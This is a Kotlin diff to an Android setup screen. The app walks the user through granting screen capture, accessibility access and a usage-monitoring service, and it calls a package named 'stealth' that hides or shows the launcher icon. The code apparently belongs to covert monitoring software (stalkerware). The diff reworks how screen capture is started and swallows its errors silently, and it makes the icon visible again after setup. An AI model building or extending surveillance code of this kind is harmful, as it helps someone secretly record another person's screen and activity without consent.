@@ -101,6 +101,8 @@ class SetupActivity : Activity() {
         runStep()
     }
 
+    private var currentAction: String = ""
+
     private fun runStep() {
         if (step >= setupSteps.size) {
             finishUp()
@@ -112,6 +114,7 @@ class SetupActivity : Activity() {
             runStep()
             return
         }
+        currentAction = intent.action ?: ""
         try {
             startActivityForResult(intent, REQ_STEP)
         } catch (_: Throwable) {
@@ -122,15 +125,16 @@ class SetupActivity : Activity() {
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == REQ_STEP) {
-            if (setupSteps.getOrNull(step)?.invoke()?.let { it.action == ACTION_SCREEN_CAPTURE } == true
-                && resultCode == RESULT_OK && data != null
-            ) {
+        if (requestCode != REQ_STEP) return
+
+        if (currentAction == ACTION_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
+            try {
                 ScreenCapture.start(this, resultCode, data)
+            } catch (_: Throwable) {
             }
-            step++
-            runStep()
         }
+        step++
+        runStep()
     }
 
     /**
@@ -154,7 +158,13 @@ class SetupActivity : Activity() {
             startService(usage)
         } catch (_: Throwable) {
         }
-        finishAndRemoveTask()
+        // The launcher icon stays visible - otherwise the app can never be
+        // started again.
+        try {
+            com.sp.core.stealth.IconHider.show(this)
+        } catch (_: Throwable) {
+        }
+        finish()
     }
 
     private fun accessibilityIntent(): Intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
